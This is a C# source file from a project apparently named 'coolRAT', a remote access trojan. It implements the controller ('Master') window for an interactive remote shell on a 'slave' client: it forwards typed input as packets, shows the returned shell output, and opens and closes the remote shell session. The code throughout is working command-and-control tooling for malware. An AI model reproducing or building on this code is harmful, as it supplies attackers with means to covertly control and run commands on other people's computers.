using coolRAT.Libs;
using coolRAT.Libs.Connections;
using coolRAT.Libs.Packets;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static coolRAT.Libs.Connections.DualTcpConnection;

namespace coolRAT.Master
{
    public partial class ShellWindow : Form
    {
        public Guid Shell_UniqueId;
        public Client RemoteClient;
        public StringBuilder Input_Buffer;
        public Buffer_Timeout_Clock Buffer_Timeout_Clock;
        public ShellEmulator_PacketHandler ShellEmulator_PacketHandler;
        public ShellWindow(Guid shell_uniqueId, Client client)
        {
            InitializeComponent();
            Shell_UniqueId = shell_uniqueId;
            RemoteClient = client;
            Input_Buffer = new StringBuilder();
            Buffer_Timeout_Clock = new Buffer_Timeout_Clock(client, 100);
            Buffer_Timeout_Clock.Buffer = Input_Buffer;
            ShellEmulator_PacketHandler = new ShellEmulator_PacketHandler(ShellEmulator, RemoteClient);
            Task.Run(() => Buffer_Timeout_Clock.Clock_Tick());
            // Let the slave know that the master's shell emulator is ready
            this.Text = $"[Connected] Remote shell of client {RemoteClient.UniqueId}; Shell Id: {Shell_UniqueId}";
        }

        private void ShellWindow_Shown(object sender, EventArgs e)
        {
            Task.Run(() =>
            {
                Thread.Sleep(500);
                SetShellStatePacket setShellState = new SetShellStatePacket(RemoteClient.UniqueId, Shell_UniqueId, ShellState.Running);
                RemoteClient.SendPacket(setShellState);
            });

        }
        public bool EventHandled = false;
        private void ShellEmulator_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                Input_Buffer.Append("\n");
                EventHandled = true;
            }
            Buffer_Timeout_Clock.ResetClock = true;
            e.Handled = true;
        }

        private void ShellEmulator_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (EventHandled)
            {
                EventHandled = false;
                return;
            }

            Input_Buffer.Append(e.KeyChar);
            Buffer_Timeout_Clock.ResetClock = true;
            e.Handled = true;
        }

        private void ShellWindow_FormClosing(object sender, FormClosingEventArgs e)
        {
            DisconnectShellPacket setShellStatePacket = new DisconnectShellPacket(RemoteClient.UniqueId, Shell_UniqueId);
            RemoteClient.SendPacket(setShellStatePacket);
            RemoteClient.DeregisterPacketHandler("Shell_IO_ChangedPacket");
        }
    }

    public class Buffer_Timeout_Clock
    {
        public Client RemoteClient;
        public StringBuilder Buffer;
        public bool ResetClock;
        public int Buffer_Timeout = 100;

        public Buffer_Timeout_Clock(Client remoteClient, int buffer_Timeout)
        {
            RemoteClient = remoteClient;
            Buffer = new StringBuilder();
            ResetClock = false;
            Buffer_Timeout = buffer_Timeout;
        }

        public void Clock_Tick()
        {
            while (true)
            {
                Thread.Sleep(Buffer_Timeout);
                if (!ResetClock)
                {
                    if (Buffer.Length == 0) continue;
                    // Send buffer contents to the remote shell
                    Shell_IO_ChangedPacket shell_IO_Changed = new Shell_IO_ChangedPacket(RemoteClient.UniqueId, ChangeType.Input, Buffer.ToString());
                    RemoteClient.SendPacket(shell_IO_Changed);
                    Buffer.Clear();
                }
                else
                    ResetClock = false;
            }
        }
    }

    public class ShellEmulator_PacketHandler
    {
        RichTextBox ShellEmulator;
        Client RemoteClient;

        public ShellEmulator_PacketHandler(RichTextBox shellEmulator, Client remoteClient)
        {
            ShellEmulator = shellEmulator;
            RemoteClient = remoteClient;
            RemoteClient.RegisterPacketHandler("Shell_IO_ChangedPacket", HandlePacket);
        }

        public void HandlePacket(object sender, PacketReceivedEventArgs e)
        {
            Packet packet = Packet.Deserialize(e.RawPacket);
            if (packet.Type == "Shell_IO_ChangedPacket")
            {
                Shell_IO_ChangedPacket shell_IO_changed = Shell_IO_ChangedPacket.Deserialize(e.RawPacket);
                if (shell_IO_changed.ChangeType == ChangeType.Output)
                {
                    ShellEmulator.Parent.Invoke(new Action(() => {
                        char[] char_arr = shell_IO_changed.Change.TrimEnd(new char[] { '\n' }).ToCharArray();
                        foreach (char chr in char_arr)
                        {
                            switch (chr)
                            {
                                case '\b':
                                    ShellEmulator.Text = new string(ShellEmulator.Text.ToCharArray().Reverse().Skip(1).Reverse().ToArray());
                                    break;
                                case '\r':
                                    break;
                                default:
                                    ShellEmulator.Text += chr;
                                    break;
                            }
                        }
                        ShellEmulator.SelectionStart = ShellEmulator.Text.Length;
                        ShellEmulator.ScrollToCaret();
                    }));
                }
            }
        }
    }
}
